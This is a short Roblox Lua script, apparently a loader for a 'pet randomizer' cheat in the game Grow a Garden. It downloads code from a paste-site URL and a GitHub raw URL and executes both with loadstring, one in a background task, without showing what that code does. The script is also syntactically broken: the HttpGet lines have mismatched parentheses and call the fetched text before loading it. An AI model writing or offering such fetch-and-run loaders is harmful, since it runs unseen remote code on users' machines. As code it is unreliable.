local s1 = game:HttpGet("https://api.rubis.app/v2/scrap/2LzjD0nq9zn1xTv7/raw", true))()
local s2 = game:HttpGet("https://raw.githubusercontent.com/gagscript-server2/PetRandomizerScript/refs/heads/main/growgarden.lua"))()

-- Load s1 normally
loadstring(s1)()

-- Load s2 concurrently
task.spawn(function()
    loadstring(s2)()
end)
